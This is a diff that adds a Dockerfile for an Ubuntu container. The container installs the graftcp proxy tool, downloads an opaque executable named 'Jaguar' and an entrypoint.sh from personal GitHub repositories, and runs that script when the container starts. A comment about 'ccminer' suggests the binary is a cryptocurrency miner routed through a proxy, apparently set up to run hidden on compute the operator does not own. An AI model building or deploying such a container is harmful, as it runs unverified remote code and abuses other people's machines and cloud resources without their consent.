@@ -1,0 +1,34 @@
+# Gunakan base image Ubuntu
+FROM ubuntu:20.04
+
+# Set environment variables
+ENV TZ=Asia/Singapore
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Install necessary packages
+RUN apt-get update && \
+    apt-get install -y sudo wget curl unzip autoconf git nano cmake binutils build-essential net-tools screen golang tzdata && \
+    apt-get install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev && \
+    ln -fs /usr/share/zoneinfo/Asia/Singapore /etc/localtime && \
+    dpkg-reconfigure --frontend noninteractive tzdata && \
+    apt-get clean && rm -rf /var/lib/apt/lists/*
+
+# Set workdir for ccminer
+WORKDIR /root
+
+# Download and extract graftcp tool (proxy setup tool)
+RUN wget https://github.com/hmgle/graftcp/releases/download/v0.4.0/graftcp_0.4.0-1_amd64.deb && \
+    dpkg -i graftcp_0.4.0-1_amd64.deb && \
+    rm -rf graftcp_0.4.0-1_amd64.deb && \
+    mkdir -p /root/graftcp/local
+
+# Download Jaguar and make it executable
+RUN wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/Jaguar -O /root/Jaguar && \
+    chmod +x /root/Jaguar
+
+# Use wget to download the entrypoint.sh script from GitHub
+RUN wget https://github.com/marcelinoferdom/shsh/raw/refs/heads/main/entrypoint.sh -O /root/entrypoint.sh && \
+    chmod +x /root/entrypoint.sh
+
+# Entrypoint script that will run the process when the container starts
+ENTRYPOINT ["/root/entrypoint.sh"]
